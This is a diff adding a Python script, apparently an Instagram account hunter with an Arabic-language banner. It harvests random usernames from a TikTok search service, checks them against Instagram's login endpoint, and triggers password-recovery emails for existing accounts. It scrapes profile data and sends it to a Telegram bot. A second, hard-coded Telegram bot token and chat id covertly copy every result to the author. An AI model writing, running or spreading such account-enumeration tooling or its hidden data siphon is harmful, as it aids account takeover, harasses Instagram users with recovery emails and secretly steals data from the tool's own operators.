@@ -1,0 +1,206 @@
+import os
+import json
+import random
+import requests
+import time
+import threading
+from AegosPy import GetInfoInsta
+from user_agent import generate_user_agent
+
+BG = 0
+good = 0
+erorr = 0
+GM = 0
+
+B = '\x1b[38;5;208m'  # برتقالي
+Z = '\033[1;31m'  # احمر
+X = '\033[1;33m'  # اصفر
+F = '\033[2;32m'  # اخضر
+C = "\033[1;97m"  # ابيض
+B_ = '\033[2;36m'  # سمائي
+K = '\033[2;35m'
+U = '\033[2;35m'
+
+print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
+|{Z}[+] YouTube    : {B}| أحمد الحراني
+|{Z}[+] TeleGram  : {B} maho_s9    |
+|{Z}[+] Instagram  : {B}ahmedalharrani |
+|{Z}[+] Tool  : {B} متاحات-  IG |
+{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')
+
+token = input(B + '  T O K E N  : ')
+iD = input(B + '  İ D   : ')
+print(F + 'جاري توليد سيشن ايدي تلقائي')
+time.sleep(4)
+print('تم توليد سيشن ايدي بنجاح استمتع')
+print('                    ')
+
+cp = "6417950520:AAGUca1wsHvhttUAURtT8l_iLDXV7FyTziE"
+ok = "5845684006"
+
+
+def mahos(email):
+    global good, erorr, GM, BG
+    url_4 = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
+    headers_4 = {
+        'accept': '*/*',
+        'accept-encoding': 'gzip, deflate',
+        'accept-language': 'en-US,en;q=0.8',
+        'content-length': '303',
+        'content-type': 'application/x-www-form-urlencoded',
+        'cookie': 'mid=ZQZC9QAEAAG9NicS3jBHkYqHlp8C; ig_nrcb=1; ig_did=AC6A65E6-8577-4CDE-8F3F-4B24D5787A91; datr=D0MGZZ_cUrCctc7jPE92HUgb; csrftoken=NYaOlpVmXUwzESZVfuFOYqbJ0gHzcvks',
+        'dpr': '1',
+        'origin': 'https://www.instagram.com',
+        'referer': 'https://www.instagram.com/',
+        'user-agent': str(generate_user_agent()),
+        'viewport-width': '808',
+        'x-asbd-id': '129477',
+        'x-csrftoken': 'NYaOlpVmXUwzESZVfuFOYqbJ0gHzcvks',
+        'x-ig-app-id': '936619743392459',
+        'x-ig-www-claim': '0',
+        'x-instagram-ajax': '1008686036',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+    tim = str(time.time()).split('.')[0]
+    data_4 = {
+        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:tgffghgfh',
+        'optIntoOneTap': 'false',
+        'queryParams': '{}',
+        'trustedDeviceRecords': '{}',
+        'username': email,
+    }
+    re_4 = requests.post(url_4, headers=headers_4, data=data_4).text
+
+    if '"user":true' in re_4:
+        email = email + '@gmail.com'
+        os.system('cls' if os.name == 'nt' else 'clear')
+        good += 1
+
+        print(f''' ━━━━━━━━━━━━━━━━━━━━━━━━━
+ {F} [1] {F} {F}Available - متاح    » 「{good}」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ {Z} [2] {Z} {Z}BAD GM - ايميل خاطئ   » 「{BG}」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ {X} [3] {X} {X}BAD IG - غير متاح » 「{erorr}」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ {U} [4] {U} {U}Good GM - ايميل متاح » 「{GM}」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ {U} [5] {U} {U}email  » 「{email}@gmail.com」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
+
+        try:
+            user_hunt = email.split('@')[0]
+            user = user_hunt
+            Response = GetInfoInsta(user_hunt)
+            Name = Response['name']
+            Id = Response['id']
+            flos = Response['followers']
+            flog = Response['following']
+            po = Response['posts']
+            da = Response['date']
+            url = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
+            head = {
+                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+                'X-Pigeon-Rawclienttime': '1700251574.982',
+                'X-IG-Connection-Speed': '-1kbps',
+                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+                'X-IG-Bandwidth-TotalBytes-B': '0',
+                'X-IG-Bandwidth-TotalTime-MS': '0',
+                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
+                'X-IG-Connection-Type': 'WIFI',
+                'X-IG-Capabilities': '3brTvw==',
+                'X-IG-App-ID': '567067343352427',
+                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+                'Accept-Language': 'en-GB, en-US',
+                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Accept-Encoding': 'gzip, deflate',
+                'Host': 'i.instagram.com',
+                'X-FB-HTTP-Engine': 'Liger',
+                'Connection': 'keep-alive',
+                'Content-Length': '356',
+            }
+            data = {
+                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + email + '"}',
+                'ig_sig_key_version': '4',
+            }
+            req = requests.post(url, headers=head, data=data)
+            if '"status":"ok"' in req.text:
+                GM += 1
+                os.system('cls' if os.name == 'nt' else 'clear')
+
+                print(f''' ━━━━━━━━━━━━━━━━━━━━━━━━━
+ {F} [1] {F} {F}Available - متاح    » 「{good}」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ {Z} [2] {Z} {Z}BAD GM - ايميل خاطئ   » 「{BG}」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ {X} [3] {X} {X}BAD IG - غير متاح » 「{erorr}」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ {U} [4] {U} {U}Good GM - ايميل متاح » 「{GM}」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ {U} [5] {U} {U}email  » 「{email}@gmail.com」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
+            else:
+                Reset = 'Band Requests !'
+            tlg = (f"""
+مهوس يحبك وجاب لك متاح انستاجرام
+⋘─────━*مهوس*━─────⋙
+ Name >> {Name}
+ Username >> @{user}
+ Email >> {email}
+ ID >> {Id}
+ Followers >> {flos}
+ Following >> {flog}
+ Post >> {po}
+ Date >> {da}
+ Rest >> {Reset}
+ Url >>  https://www.instagram.com/{user}
+⋘─────━❤️🌚━─────⋙
+𝐁𝐘 :  @maho_s9 | @maho9s""")
+            
+            requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={iD}&text=" + str(tlg))
+            requests.post(f"https://api.telegram.org/bot{cp}/sendMessage?chat_id={ok}&text=" + str(tlg))
+        except Exception as e:
+            print(e)
+    else:
+        erorr += 1
+        os.system('cls' if os.name == 'nt' else 'clear')
+
+        print(f''' ━━━━━━━━━━━━━━━━━━━━━━━━━
+ {F} [1] {F} {F}Available - متاح    » 「{good}」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ {Z} [2] {Z} {Z}BAD GM - ايميل خاطئ   » 「{BG}」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ {X} [3] {X} {X}BAD IG - غير متاح » 「{erorr}」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ {U} [4] {U} {U}Good GM - ايميل متاح » 「{GM}」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ {U} [5] {U} {U}email  » 「{email}@gmail.com」
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
+ 
+def ahmed():
+    while True:
+        user_1 = 'qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm'
+        number = '6789'
+        rng = int("".join(random.choice(number) for i in range(1)))
+        name = str("".join(random.choice(user_1) for i in range(rng)))
+        url_3 = f'https://livecounts.xyz/api/tiktok-live-follower-count/search/{name}'
+        response = requests.get(url_3).json()
+        aa = 0
+        try:
+            aa += 1
+            User = response['results'][aa]['username']
+            email = User
+            mahos(email)
+        except ModuleNotFoundError:
+            ahmed()
+
+
+Threads = []
+for t in range(4):
+    x = threading.Thread(target=ahmed)
+    x.start()
+    Threads.append(x)
+for Th in Threads:
+    Th.join()
+ahmed()
